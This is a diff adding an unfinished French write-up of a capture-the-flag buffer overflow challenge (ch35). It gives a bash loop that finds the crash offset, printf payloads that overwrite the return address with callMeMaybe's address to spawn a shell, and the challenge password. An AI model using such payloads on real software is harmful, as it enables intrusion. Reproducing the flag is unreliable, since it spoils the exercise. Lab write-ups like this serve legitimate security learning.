@@ -1,0 +1,34 @@
+TO FINISH (SEE '\\')
+
+
+
+
+
+Le programme lit des un nombre indefini de caracteres dans un buffer de 256.
+On recuperer l'adresse de la fonction callMeMaybe via nm (`nm ch35`)
+On recupere 00000000004006cd qu'on inverse par deux car Little Endian soit cd06400000000000
+
+Methode plutot crade mais qui fonctionne :)
+On va executer ce script pour savoir a partir de quand le programme segfault, ce qui signifiera qu'on commence a ecraser l'adresse de callMeMaybe:
+-----------------------
+#!/bin/bash
+CUR=0
+STR=""
+while [ true ]; do
+	STR="a$STR"
+	CUR=$((CUR+1))
+	echo "cur=$CUR"
+	printf "$STR" | /challenge/app-systeme/ch35/ch35
+	echo ""
+	sleep 0.1
+done
+-------------------------
+
+Le programme segfault a partir donc du 280e caractere donc :
+
+printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x06\x40\x00\x00\x00\x00\x00" | ./ch35
+
+Comme auparavant, le shell se lance et se ferme tout de suite, donc on utilise cat
+(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x06\x40\x00\x00\x00\x00\x00" ; cat) | ./ch35
+
+password = B4sicBufferOverflow
